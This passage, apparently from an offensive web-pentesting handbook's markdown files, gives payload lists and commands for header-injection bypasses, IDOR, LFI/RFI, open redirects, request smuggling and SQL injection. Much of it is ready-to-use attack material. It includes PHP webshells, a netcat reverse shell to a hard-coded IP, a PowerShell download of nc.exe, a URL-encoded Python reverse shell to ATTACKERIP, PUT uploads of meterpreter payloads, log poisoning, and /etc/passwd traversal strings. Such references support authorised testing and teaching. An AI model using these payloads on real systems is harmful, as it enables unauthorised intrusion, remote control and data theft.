+Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east-1/execute-api/aws4_
+```
+
+## Common checks
+
+```bash
+# robots.txt
+curl http://example.com/robots.txt
+# headers
+wget --save-headers http://www.example.com/
+    # Strict-Transport-Security (HSTS)
+    # X-Frame-Options: SAMEORIGIN
+    # X-XSS-Protection: 1; mode=block
+    # X-Content-Type-Options: nosniff
+# Cookies
+    # Check Secure and HttpOnly flag in session cookie
+    # If exists BIG-IP cookie, app behind a load balancer
+# SSL Ciphers
+nmap --script ssl-enum-ciphers -p 443 www.example.com
+# HTTP Methods
+nmap -p 443 --script http-methods www.example.com
+# Cross Domain Policy
+curl http://example.com/crossdomain.xml
+    # allow-access-from domain="*"
+
+# Cookies explained
+https://cookiepedia.co.uk/
+```
+
+## Security headers explanation
+
+![](<../../.gitbook/assets/image (11).png>)
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/header-injections.md
+# Header injections
+
+## Headers
+
+```bash
+# Add something like 127.0.0.1, localhost, 192.168.1.2, target.com or /admin, /console
+Client-IP:
+Connection:
+Contact:
+Forwarded:
+From:
+Host:
+Origin:
+Referer:
+True-Client-IP:
+X-Client-IP:
+X-Custom-IP-Authorization:
+X-Forward-For:
+X-Forwarded-For:
+X-Forwarded-Host:
+X-Forwarded-Server:
+X-Host:
+X-Original-URL:
+X-Originating-IP:
+X-Real-IP:
+X-Remote-Addr:
+X-Remote-IP:
+X-Rewrite-URL:
+X-Wap-Profile:
+
+# Try to repeat same Host header 2 times
+Host: legit.com
+Stuff: stuff
+Host: evil.com
+
+# Bypass type limit
+Accept: application/json, text/javascript, */*; q=0.01
+Accept: ../../../../../../../../../etc/passwd{{'
+
+# Try to change the HTTP version from 1.1 to HTTP/0.9 and remove the host header
+
+# 401/403 bypasses 
+# Whitelisted IP 127.0.0.1 or localhost
+Client-IP: 127.0.0.1
+Forwarded-For-Ip: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded-For: localhost
+Forwarded: 127.0.0.1
+Forwarded: localhost
+True-Client-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forward: 127.0.0.1
+X-Forward: localhost
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-By: localhost
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For-Original: localhost
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded-Server: localhost
+X-Forwarded: 127.0.0.1
+X-Forwarded: localhost
+X-Forwared-Host: 127.0.0.1
+X-Forwared-Host: localhost
+X-Host: 127.0.0.1
+X-Host: localhost
+X-HTTP-Host-Override: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-Addr: localhost
+X-Remote-IP: 127.0.0.1
+
+# Fake Origin - make GET request to accesible endpoint with:
+X-Original-URL: /admin
+X-Override-URL: /admin
+X-Rewrite-URL: /admin
+Referer: /admin
+# Also try with absoulte url https:/domain.com/admin
+
+# Method Override
+X-HTTP-Method-Override: PUT
+
+# Provide full path GET
+GET https://vulnerable-website.com/ HTTP/1.1
+Host: evil-website.com
+
+# Add line wrapping
+GET /index.php HTTP/1.1
+ Host: vulnerable-website.com
+Host: evil-website.com
+
+# Wordlists
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers
+https://github.com/danielmiessler/SecLists/tree/bbb4d86ec1e234b5d3cfa0a4ab3e20c9d5006405/Miscellaneous/web/http-request-headers
+```
+
+## Tools
+
+```bash
+# https://github.com/lobuhi/byp4xx
+./byp4xx.sh https://url/path
+# https://github.com/OdinF13/Bug-Bounty-Scripts
+
+# https://github.com/mlcsec/headi
+headi -url http://target.com/admin
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/idor.md
+# IDOR
+
+## Basics
+
+```text
+Check for valuable words:
+{regex + perm} id
+{regex + perm} user
+{regex + perm} account
+{regex + perm} number
+{regex + perm} order
+{regex + perm} no
+{regex + perm} doc
+{regex + perm} key
+{regex + perm} email
+{regex + perm} group
+{regex + perm} profile
+{regex + perm} edit
+```
+
+## Bypasses
+
+* Add parameters onto the endpoints for example, if there was
+
+```text
+GET /api_v1/messages --> 401
+vs 
+GET /api_v1/messages?user_id=victim_uuid --> 200
+```
+
+* HTTP Parameter pollution
+
+```text
+GET /api_v1/messages?user_id=VICTIM_ID --> 401 Unauthorized
+GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK
+
+GET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]
+```
+
+* Add .json to the endpoint, if it is built in Ruby!
+
+```text
+/user_data/2341 --> 401 Unauthorized
+/user_data/2341.json --> 200 OK
+```
+
+* Test on outdated API Versions
+
+```text
+/v3/users_data/1234 --> 403 Forbidden
+/v1/users_data/1234 --> 200 OK
+```
+
+Wrap the ID with an array.
+
+```text
+{“id”:111} --> 401 Unauthriozied
+{“id”:[111]} --> 200 OK
+```
+
+Wrap the ID with a JSON object:
+
+```text
+{“id”:111} --> 401 Unauthriozied
+
+{“id”:{“id”:111}} --> 200 OK
+```
+
+JSON Parameter Pollution:
+
+```text
+POST /api/get_profile
+Content-Type: application/json
+{“user_id”:<legit_id>,”user_id”:<victim’s_id>}
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/lfi-rfi.md
+# LFI/RFI
+
+## Tools
+
+```bash
+# https://github.com/kurobeats/fimap
+fimap -u "http://10.11.1.111/example.php?test="
+# https://github.com/P0cL4bs/Kadimus
+./kadimus -u localhost/?pg=contact -A my_user_agent
+# https://github.com/wireghoul/dotdotpwn
+dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
+# Apache specific: https://github.com/imhunterand/ApachSAL
+```
+
+{% hint style="info" %}
+**How to**
+
+1. Look requests with filename like `include=main.inc template=/en/sidebar file=foo/file1.txt`
+2. Modify and test: `file=foo/bar/../file1.txt`&#x20;
+   1. If the response is the same could be vulnerable
+   2. If not there is some kind of block or sanitizer
+3. Try to access world-readable files like `/etc/passwd /win.ini`
+{% endhint %}
+
+## LFI
+
+```bash
+# Basic LFI
+curl -s http://10.11.1.111/gallery.php?page=/etc/passwd
+
+# If LFI, also check
+/var/run/secrets/kubernetes.io/serviceaccount
+
+# PHP Filter b64
+http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
+http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
+http://10.11.1.111/maliciousfile.txt%00?page=php://filter/convert.base64-encode/resource=../config.php
+# Nullbyte ending
+http://10.11.1.111/page=http://10.11.1.111/maliciousfile%00.txt
+http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00
+# Other techniques
+https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
+https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
+https://abc.redact.com/static/../../../../../../../../../../../../../../../etc/passwd
+https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
+https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
+https://abc.redact.com/asd.php?file:///etc/passwd
+https://abc.redact.com/asd.php?file:///etc/passwd%00
+https://abc.redact.com/asd.php?file:///etc/passwd%00.html
+https://abc.redact.com/asd.php?file:///etc/passwd%00.ext
+https://abc.redact.com/asd.php?file:///..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext/etc/passwd
+https://target.com/admin..;/
+https://target.com/../admin
+https://target.com/whatever/..;/admin
+https://target.com/whatever.php~
+# Cookie based
+GET /vulnerable.php HTTP/1.1
+Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
+# LFI Windows
+http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
+http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
+http://10.11.1.111/addguestbook.php?LANG=../../../../../../../../../../../../../../../boot.ini
+http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
+http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
+http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini
+http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00
+http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.html
+http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini
+http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00
+http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.html
+http://10.11.1.111/addguestbook.php?LANG=file:///C:/boot.ini
+http://10.11.1.111/addguestbook.php?LANG=file:///C:/win.ini
+http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.ext
+http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.ext
+
+# LFI using video upload:
+https://github.com/FFmpeg/FFmpeg
+https://hackerone.com/reports/226756
+https://hackerone.com/reports/237381
+https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit
+https://github.com/neex/ffmpeg-avi-m3u-xbin
+
+# Contaminating log files
+root@kali:~# nc -v 10.11.1.111 80
+10.11.1.111: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.11.1.111] 80 (http) open
+ <?php echo shell_exec($_GET['cmd']);?> 
+http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig
+
+# Common LFI to RCE:
+    Using file upload forms/functions
+    Using the PHP wrapper expect://command
+    Using the PHP wrapper php://file
+    Using the PHP wrapper php://filter
+    Using PHP input:// stream
+    Using data://text/plain;base64,command
+    Using /proc/self/environ
+    Using /proc/self/fd
+    Using log files with controllable input like:
+        /var/log/apache/access.log
+        /var/log/apache/error.log
+        /var/log/vsftpd.log
+        /var/log/sshd.log
+        /var/log/mail
+
+# LFI possibilities by filetype
+    ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
+    SVG: Stored XSS / SSRF / XXE
+    GIF: Stored XSS / SSRF
+    CSV: CSV injection
+    XML: XXE
+    AVI: LFI / SSRF
+    HTML / JS : HTML injection / XSS / Open redirect
+    PNG / JPEG: Pixel flood attack (DoS)
+    ZIP: RCE via LFI / DoS
+    PDF / PPTX: SSRF / BLIND XXE
+    
+# Chaining with other vulns    
+../../../tmp/lol.png —> for path traversal
+sleep(10)-- -.jpg —> for SQL injection
+<svg onload=alert(document.domain)>.jpg/png —> for XSS
+; sleep 10; —> for command injections
+
+# 403 bypasses
+/accessible/..;/admin
+/.;/admin
+/admin;/
+/admin/~
+/./admin/./
+/admin?param
+/%2e/admin
+/admin#
+/secret/
+/secret/.
+//secret//
+/./secret/..
+/admin..;/
+/admin%20/
+/%20admin%20/
+/admin%20/page
+/%61dmin
+
+# Path Bypasses
+# 16-bit Unicode encoding
+# double URL encoding
+# overlong UTF-8 Unicode encoding
+….//
+….\/
+…./\
+….\\
+```
+
+## RFI
+
+```bash
+# RFI:
+http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
+Content of evil.txt:
+<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>
+# RFI over SMB (Windows)
+cat php_cmd.php
+    <?php echo shell_exec($_GET['cmd']);?>
+# Start SMB Server in attacker machine and put evil script
+# Access it via browser (2 request attack):
+# http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
+# http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234
+
+# Cross Content Hijacking:
+https://github.com/nccgroup/CrossSiteContentHijacking
+https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/
+http://50.56.33.56/blog/?p=242
+
+# Encoding scripts in PNG IDAT chunk:
+https://yqh.at/scripts_in_pngs.php
+
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/online-hashes-cracked.md
+# Online hashes cracked
+
+```bash
+https://www.cmd5.org/
+http://hashes.org
+https://www.onlinehashcrack.com/
+https://gpuhash.me/
+https://crackstation.net/
+https://crack.sh/
+https://hash.help/
+https://passwordrecovery.io/
+http://cracker.offensive-security.com/
+https://md5decrypt.net/en/Sha256/
+https://weakpass.com/wordlists
+https://hashes.com/en/decrypt/hash
+```
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/open-redirect.md
+# Open Redirect
+
+## Tools
+
+```bash
+#https://github.com/0xNanda/Oralyzer
+python3 oralyzer.py -u https://website.com/redir?url=
+#https://github.com/devanshbatham/OpenRedireX
+python3 openredirex.py -u "https://website.com/?url=FUZZ" -p payloads.txt --keyword FUZZ
+
+# https://github.com/m0chan/BugBounty/blob/master/OpenRedirectFuzzing.txt
+```
+
+## Attacks
+
+```markup
+https://web.com/r/?url=https://phising-malicious.com
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
+
+# Check redirects
+https://url.com/redirect/?url=http://twitter.com/
+http://www.theirsite.com@yoursite.com/
+http://www.yoursite.com/http://www.theirsite.com/
+http://www.yoursite.com/folder/www.folder.com
+/http://twitter.com/
+/\\twitter.com
+/\/twitter.com
+?c=.twitter.com/
+/?redir=google。com
+//google%E3%80%82com
+//google%00.com
+/%09/google.com
+/%5cgoogle.com
+//www.google.com/%2f%2e%2e
+//www.google.com/%2e%2e
+//google.com/
+//google.com/%2f..
+//\google.com
+/\victim.com:80%40google.com
+
+# Remember url enconde the payloads!
+
+# Search in Burp:
+“=http” or “=aHR0”（base64 encode http）
+
+# Fuzzing openredirect
+
+# Intruder url open redirect
+/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}
+
+# Valid URLs:
+http(s)://evil.com
+http(s):\\evil.com
+//evil.com
+///evil.com
+/\evil.com
+\/evil.com
+/\/evil.com
+\\evil.com
+\/\evil.com
+/ /evil.com
+\ \evil.com
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/open-redirects.md
+# Open redirects
+
+## Tools
+
+```bash
+#https://github.com/devanshbatham/OpenRedireX
+python3 openredirex.py -u "https://website.com/?url=FUZZ" -p payloads.txt --keyword FUZZ
+
+#https://github.com/0xNanda/Oralyzer
+python3 oralyzer.py -u https://website.com/redir?url=
+
+# Payload generator
+# https://gist.github.com/zPrototype/b211ae91e2b082420c350c28b6674170
+```
+
+## Payloads
+
+```bash
+# Check for
+=aHR0
+=http
+# https://github.com/m0chan/BugBounty/blob/master/OpenRedirectFuzzing.txt
+
+https://web.com/r/?url=https://phising-malicious.com
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
+
+# Check redirects
+https://url.com/redirect/?url=http://twitter.com/
+http://www.theirsite.com@yoursite.com/
+http://www.yoursite.com/http://www.theirsite.com/
+http://www.yoursite.com/folder/www.folder.com
+/http://twitter.com/
+/\\twitter.com
+/\/twitter.com
+?c=.twitter.com/
+/?redir=google。com
+//google%E3%80%82com
+//google%00.com
+/%09/google.com
+/%5cgoogle.com
+//www.google.com/%2f%2e%2e
+//www.google.com/%2e%2e
+//google.com/
+//google.com/%2f..
+//\google.com
+/\victim.com:80%40google.com
+https://target.com///google.com//
+# Remember url enconde the payloads!
+
+# Search in Burp:
+“=http” or “=aHR0”（base64 encode http）
+
+# Fuzzing openredirect
+
+# Intruder url open redirect
+/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}
+
+# Valid URLs:
+http(s)://evil.com
+http(s):\\evil.com
+//evil.com
+///evil.com
+/\evil.com
+\/evil.com
+/\/evil.com
+\\evil.com
+\/\evil.com
+/ /evil.com
+\ \evil.com
+
+# Oneliner with gf
+echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/parameter-pollution.md
+# HTTP Parameter pollution
+
+```
+# Inject existing extra parameters in GET:
+https://www.bank.com/transfer?from=12345&to=67890&amount=5000&from=ABCDEF
+https://www.site.com/sharer.php?u=https://site2.com/blog/introducing?&u=https://site3.com/test
+```
+
+![](<../../.gitbook/assets/image (17).png>)
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/pastejacking.md
+# Pastejacking
+
+{% embed url="https://research.securitum.com/the-curious-case-of-copy-paste/" %}
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/prototype-pollution.md
+# Prototype Pollution
+
+```text
+# https://github.com/msrkp/PPScan
+# https://github.com/BlackFan/client-side-prototype-pollution
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/quick-tricks.md
+# Quick tricks
+
+```bash
+# Web ports for nmap
+80,81,300,443,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8083,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,11371,12443,16080,18091,18092,20720,55672
+
+# Technology scanner
+# https://github.com/urbanadventurer/WhatWeb
+whatweb htttps://url.com
+
+# Screenshot web
+# https://github.com/maaaaz/webscreenshot
+# https://github.com/sensepost/gowitness
+# https://github.com/michenriksen/aquatone
+
+# Get error with in input
+%E2%A0%80%0A%E2%A0%80
+
+# Retrieve additional info:
+/favicon.ico/..%2f
+/lol.png%23
+/../../../
+?debug=1
+/server-status
+/files/..%2f..%2f
+
+# Change default header to accept */*
+Accept: application/json, text/javascript, */*; q=0.01
+
+# Sitemap to wordlist (httpie)
+http https://target.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g' > wordlist_endpoints.txt
+
+# Bypass Rate Limits:
+# Use different params: 
+    sign-up, Sign-up, SignUp
+# Null byte on params:
+    %00, %0d%0a, %09, %0C, %20, %0
+
+# Bypass upload restrictions:
+# Change extension: .pHp3 or pHp3.jpg
+# Modify mimetype: Content-type: image/jpeg
+# Bypass getimagesize(): exiftool -Comment='"; system($_GET['cmd']); ?>' file.jpg
+# Add gif header: GIF89a;
+# All at the same time.
+
+# ImageTragic (memory leaks in gif preview)
+# https://github.com/neex/gifoeb
+./gifoeb gen 512x512 dump.gif
+# Upload dump.gif multiple times, check if preview changes.
+# Check docs for exploiting
+
+# If upload from web is allowed or :
+# https://medium.com/@shahjerry33/pixel-that-steals-data-im-invisible-3c938d4c3888
+# https://iplogger.org/invisible/
+# https://iplogger.org/15bZ87
+
+# Check HTTP options:
+# Check if it is possible to upload
+curl -v -k -X OPTIONS https://10.11.1.111/
+# If put enabled, upload:
+curl -v -X PUT -d '' http://10.11.1.111/test/shell.php
+nmap -p 80 192.168.1.124 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'
+curl -v -X PUT -d '' http://VICTIMIP/test/cmd.php && http://VICTIMIP/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22ATTACKERIP%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+curl -i -X PUT -H “Content-Type: text/plain; charset=utf-8” -d “/root/Desktop/meterpreter.php” http://VICTIMIP:8585/uploads/meterpreter.php
+# If PUT is not allowed, try to override:
+X-HTTP-Method-Override: PUT
+X-Method-Override: PUT
+
+# Retrieve endpoints
+# LinkFinder
+# https://github.com/GerbenJavado/LinkFinder
+python linkfinder.py -i https://example.com -d
+python linkfinder.py -i burpfile -b
+
+# Retreive hidden parameters
+# Tools
+# https://github.com/s0md3v/Arjun
+python3 arjun.py -u https://url.com --get 
+python3 arjun.py -u https://url.com --post
+# https://github.com/maK-/parameth
+python parameth.py -u https://example.com/test.php
+# https://github.com/devanshbatham/ParamSpider
+python3 paramspider.py --domain example.com
+# https://github.com/s0md3v/Parth
+python3 parth.py -t example.com
+
+# .DS_Store files?
+# https://github.com/gehaxelt/Python-dsstore
+python main.py samples/.DS_Store.ctf
+
+# Polyglot RCE payload
+1;sleep${IFS}9;#${IFS}’;sleep${IFS}9;#${IFS}”;sleep${IFS}9;#${IFS}
+
+# Nmap web scan
+nmap --script "http-*" example.com -p 443
+
+# SQLi + XSS + SSTI
+'"><svg/onload=prompt(5);>{{7*7}}
+' ==> for Sql injection 
+"><svg/onload=prompt(5);> ==> for XSS 
+{{7*7}} ==> for SSTI/CSTI
+
+# Try to connect with netcat to port 80
+nc -v host 80
+
+# Understand URL params with unfurl
+https://dfir.blog/unfurl/
+```
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/README.md
+# Web Attacks
+
+**Check out in the left submenu what common attack you want review**
+
+![](../../.gitbook/assets/y7ipicwvp5d41\[1].png)
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/request-smuggling.md
+# HTTP Request Smuggling
+
+## General
+
+{% hint style="info" %}
+HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers: Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.
+{% endhint %}
+
+## Tools
+
+```bash
+# https://github.com/defparam/smuggler
+python3 smuggler.py -u <URL>
+# https://github.com/defparam/tiscripts
+
+# https://github.com/anshumanpattnaik/http-request-smuggling/
+python3 smuggle.py -u <URL>
+
+# https://github.com/assetnote/h2csmuggler
+go run ./cmd/h2csmuggler check https://google.com/ http://localhost
+
+
+# HTTP/2
+# https://github.com/BishopFox/h2csmuggler
+```
+
+## Samples
+
+```http
+- The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:
+
+    POST /search HTTP/1.1
+    Host: normal-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 11
+
+    q=smuggling
+
+- The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:
+
+    POST /search HTTP/1.1
+    Host: normal-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Transfer-Encoding: chunked
+
+    b
+    q=smuggling
+    0
+
+
+
+• CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
+   ◇ Find - time delay:
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Transfer-Encoding: chunked
+    Content-Length: 4
+
+    1
+    A
+    X
+• TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
+   ◇ Find time delay:
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Transfer-Encoding: chunked
+    Content-Length: 6
+
+    0
+
+    X
+• TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
+
+- CL.TE
+    Using Burp Repeater, issue the following request twice:
+    POST / HTTP/1.1
+    Host: your-lab-id.web-security-academy.net
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+    Transfer-Encoding: chunked
+
+    0
+
+    G
+    The second response should say: Unrecognized method GPOST.
+
+ - TE.CL
+    In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
+    Using Burp Repeater, issue the following request twice:
+    POST / HTTP/1.1
+    Host: your-lab-id.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-length: 4
+    Transfer-Encoding: chunked
+
+    5c
+    GPOST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 15
+
+    x=1
+    0
+
+ - TE.TE: obfuscating TE Header
+     In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
+    Using Burp Repeater, issue the following request twice:
+    POST / HTTP/1.1
+    Host: your-lab-id.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-length: 4
+    Transfer-Encoding: chunked
+    Transfer-encoding: cow
+
+    5c
+    GPOST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 15
+
+    x=1
+    0
+```
+
+![](../../.gitbook/assets/20200520131941\[1].jpg)
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/session-fixation.md
+# Session fixation
+
+{% hint style="info" %}
+**Steps to reproduce**
+
+1. Open example.com/login.
+2. Open browser devtools.
+3. Get value for `SESSION` cookie.
+4. Open example.com/login in the incognito tab.
+5. In the incognito tab, change cookie value to the one, obtained in step 3.
+6. In the normal tab \(the one from steps 1-3\) log in as any user.
+7. Refresh page in the incognito tab.
+
+**Result**
+
+You are now logged in the incognito tab as user from step 6 as well.
+{% endhint %}
+
+END_FILE
+START_FILE: Docs/six2dez pentest-book master enumeration-web/sqli.md
+# SQLi
+
+{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}
+
+{% embed url="https://sqlwiki.netspi.com/#mysql" %}
+
+## Common
+
+```
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'   <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+/?q=(1)or(0)=(1)
+
+# Useful payloads
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+```
+
+## Polyglot
+
+```sql
+', ",'),"), (),., * /, <! -, -
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+```
+
+## Resources by type
+
+```bash
+# MySQL:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
+
+# MSQQL:
+http://evilsql.com/main/page2.php
+http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+
+# ORACLE:
+http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
+
+# POSTGRESQL:
+http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
+
+# Others
+http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
+http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet
+http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet
+http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
+https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
+http://rails-sqli.org/
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
+```
+
+## R/W files
+
+```bash
+# Read file
+UNION SELECT LOAD_FILE ("etc/passwd")-- 
+
+# Write a file
